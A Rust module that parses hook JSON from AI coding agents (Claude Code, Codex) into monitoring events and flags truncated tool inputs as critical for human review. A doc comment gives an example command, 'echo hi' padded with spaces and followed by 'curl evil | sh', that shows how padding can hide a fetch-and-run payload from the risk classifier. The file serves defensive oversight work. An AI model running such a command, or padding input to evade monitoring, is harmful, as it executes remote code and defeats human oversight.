//! Helpers shared by the hook normalisers (Claude Code and Codex command hooks): field extraction from the hook JSON
//! and the common part of an [`EventDraft`]. Hook JSON is untrusted input: every accessor is total and tolerant.

use agentnest_protocol::{Actor, AgentKind, EventKind, SourceChannel};
use serde_json::Value;

use super::post::EventDraft;
use crate::redact::{clip, head_bytes};

static NULL: Value = Value::Null;

/// Longest raw text a normaliser hands to the post-processing (masking and bounds happen there). Keeps a 1 MiB hook
/// body from being copied around.
pub const RAW_TEXT_MAX_BYTES: usize = 32 * 1024;

/// The common fields of a hook input (docs/integrations/claude-code.md 5; Codex has the same shape plus `turn_id`).
#[derive(Clone, Copy, Debug)]
pub struct Hook<'a> {
    /// The whole hook JSON.
    pub raw: &'a Value,
    /// `hook_event_name`.
    pub event_name: &'a str,
    /// `session_id`.
    pub session_id: &'a str,
    /// `cwd`.
    pub cwd: Option<&'a str>,
    /// `tool_name`.
    pub tool_name: Option<&'a str>,
    /// `tool_input` (`null` if absent).
    pub tool_input: &'a Value,
    /// `tool_use_id` (not present on `PermissionRequest`).
    pub tool_use_id: Option<&'a str>,
    /// `prompt_id`.
    pub prompt_id: Option<&'a str>,
    /// `turn_id` (Codex).
    pub turn_id: Option<&'a str>,
    /// `agent_id` (sub-agent contexts).
    pub agent_id: Option<&'a str>,
    /// `agent_type`.
    pub agent_type: Option<&'a str>,
    /// `permission_mode`.
    pub permission_mode: Option<&'a str>,
}

/// The key `agentnest-hook` (the command-hook relay) adds at the top level of a hook body when it had to cut a string
/// field above 32 KiB: `["tool_input.command", ...]` (integrations/claude-code.md 3).
pub const TRUNCATED_MARKER_KEY: &str = "_agentnest_truncated";

/// The `tool_input` to classify and hash for a hook body: the input itself, plus - when the CLI relay reported that it
/// **cut** something inside `tool_input` - the marker [`TRUNCATED_MARKER_KEY`] inside it.
///
/// A cut input cannot be judged: `echo hi<33,000 spaces>; curl evil | sh` is cut to `echo hi<spaces>` and would look
/// harmless, while the same call over an HTTP hook is seen whole. The classifier treats the marker (and any string field
/// of 32 KiB or more) as `critical` / `input_too_large` ([`crate::risk::classify`]), so the human sees a red card
/// instead of a mild one. The daemon's own copy of the input is otherwise untouched.
pub fn tool_input_with_truncation_marker(tool_input: &Value, hook: &Value) -> Value {
    let Some(Value::Array(marked)) = hook.get(TRUNCATED_MARKER_KEY) else {
        return tool_input.clone();
    };
    let concerns_tool_input = marked
        .iter()
        .filter_map(Value::as_str)
        .any(|p| p == "$" || p.starts_with("tool_input"));
    if !concerns_tool_input {
        return tool_input.clone();
    }
    match tool_input {
        Value::Object(map) => {
            let mut map = map.clone();
            map.insert(
                TRUNCATED_MARKER_KEY.to_owned(),
                Value::Array(marked.clone()),
            );
            Value::Object(map)
        }
        other => serde_json::json!({
            TRUNCATED_MARKER_KEY: marked,
            "tool_input": other,
        }),
    }
}

/// A non-empty string field.
pub fn str_field<'a>(v: &'a Value, key: &str) -> Option<&'a str> {
    v.get(key).and_then(Value::as_str).filter(|s| !s.is_empty())
}

/// The length of an array field, or the value of a numeric field (a count).
pub fn count_field(v: &Value, key: &str) -> usize {
    match v.get(key) {
        Some(Value::Array(a)) => a.len(),
        Some(Value::Number(n)) => n.as_u64().map(|u| u as usize).unwrap_or(0),
        _ => 0,
    }
}

/// `value[key]` as an integer.
pub fn int_field(v: &Value, key: &str) -> Option<i64> {
    v.get(key)
        .and_then(|x| x.as_i64().or_else(|| x.as_f64().map(|f| f as i64)))
}

/// A raw text field cut to [`RAW_TEXT_MAX_BYTES`].
pub fn raw_text(v: &Value, key: &str) -> Option<String> {
    v.get(key)
        .and_then(Value::as_str)
        .map(|s| head_bytes(s, RAW_TEXT_MAX_BYTES).0)
}

/// The first non-empty line of `s`.
pub fn first_line(s: &str) -> &str {
    s.lines()
        .find(|l| !l.trim().is_empty())
        .unwrap_or("")
        .trim()
}

impl<'a> Hook<'a> {
    /// Extracts the common fields. `None` if the input is not an object or lacks `hook_event_name` or `session_id`
    /// (such an input cannot be attributed to a session and is dropped).
    pub fn parse(raw: &'a Value) -> Option<Hook<'a>> {
        if !raw.is_object() {
            return None;
        }
        Some(Hook {
            raw,
            event_name: str_field(raw, "hook_event_name")?,
            session_id: str_field(raw, "session_id")?,
            cwd: str_field(raw, "cwd"),
            tool_name: str_field(raw, "tool_name"),
            tool_input: raw.get("tool_input").unwrap_or(&NULL),
            tool_use_id: str_field(raw, "tool_use_id"),
            prompt_id: str_field(raw, "prompt_id"),
            turn_id: str_field(raw, "turn_id"),
            agent_id: str_field(raw, "agent_id"),
            agent_type: str_field(raw, "agent_type"),
            permission_mode: str_field(raw, "permission_mode"),
        })
    }

    /// The sub-agent context: present when the hook carries an `agent_id` or `agent_type`.
    pub fn actor(&self) -> Option<Actor> {
        if self.agent_id.is_none() && self.agent_type.is_none() {
            return None;
        }
        Some(Actor {
            agent_id: self.agent_id.map(|s| clip(s, 128)),
            agent_type: self.agent_type.map(|s| clip(s, 64)),
            is_subagent: self.agent_id.is_some(),
        })
    }

    /// An [`EventDraft`] with session, actor, working directory, channel and native ids filled in.
    pub fn draft(
        &self,
        agent_kind: AgentKind,
        channel: SourceChannel,
        kind: EventKind,
    ) -> EventDraft {
        let mut d = EventDraft::new(agent_kind, self.session_id, kind, channel, self.event_name);
        d.actor = self.actor();
        d.cwd = self.cwd.map(str::to_owned);
        d.native_ids
            .insert("session_id".to_owned(), self.session_id.to_owned());
        for (k, v) in [
            ("tool_use_id", self.tool_use_id),
            ("prompt_id", self.prompt_id),
            ("turn_id", self.turn_id),
            ("agent_id", self.agent_id),
        ] {
            if let Some(v) = v {
                d.native_ids.insert(k.to_owned(), v.to_owned());
            }
        }
        d
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn parse_requires_event_and_session() {
        assert!(Hook::parse(&json!({"hook_event_name": "Stop", "session_id": "s"})).is_some());
        assert!(Hook::parse(&json!({"hook_event_name": "Stop"})).is_none());
        assert!(Hook::parse(&json!({"session_id": "s"})).is_none());
        assert!(Hook::parse(&json!({"hook_event_name": "", "session_id": "s"})).is_none());
        assert!(Hook::parse(&json!([1, 2])).is_none());
        assert!(Hook::parse(&json!(null)).is_none());
        assert!(Hook::parse(&json!({"hook_event_name": 5, "session_id": "s"})).is_none());
    }

    #[test]
    fn actor_and_ids() {
        let v = json!({"hook_event_name": "PreToolUse", "session_id": "s", "agent_id": "def456", "agent_type": "Explore", "tool_use_id": "t1", "prompt_id": "p1", "cwd": "/w"});
        let h = Hook::parse(&v).unwrap();
        let a = h.actor().unwrap();
        assert!(a.is_subagent && a.agent_id.as_deref() == Some("def456"));
        let d = h.draft(
            AgentKind::ClaudeCode,
            SourceChannel::ClaudeCodeHookHttp,
            EventKind::ToolStarted,
        );
        assert_eq!(
            d.native_ids.get("tool_use_id").map(String::as_str),
            Some("t1")
        );
        assert_eq!(
            d.native_ids.get("agent_id").map(String::as_str),
            Some("def456")
        );
        assert_eq!(d.cwd.as_deref(), Some("/w"));
        let plain = json!({"hook_event_name": "Stop", "session_id": "s", "agent_type": "my-agent"});
        let a = Hook::parse(&plain).unwrap().actor().unwrap();
        assert!(
            !a.is_subagent,
            "agent_type alone (a --agent session) is not a sub-agent"
        );
        assert!(
            Hook::parse(&json!({"hook_event_name": "Stop", "session_id": "s"}))
                .unwrap()
                .actor()
                .is_none()
        );
    }

    #[test]
    fn field_helpers_are_total() {
        let v = json!({"a": [1, 2, 3], "n": 4, "s": "x\n\nline", "neg": -1, "f": 2.7});
        assert_eq!(count_field(&v, "a"), 3);
        assert_eq!(count_field(&v, "n"), 4);
        assert_eq!(count_field(&v, "missing"), 0);
        assert_eq!(count_field(&v, "s"), 0);
        assert_eq!(int_field(&v, "f"), Some(2));
        assert_eq!(int_field(&v, "s"), None);
        assert_eq!(first_line("\n\n  hello \nworld"), "hello");
        assert!(
            raw_text(&json!({"p": "é".repeat(40_000)}), "p")
                .unwrap()
                .len()
                <= RAW_TEXT_MAX_BYTES
        );
    }
}
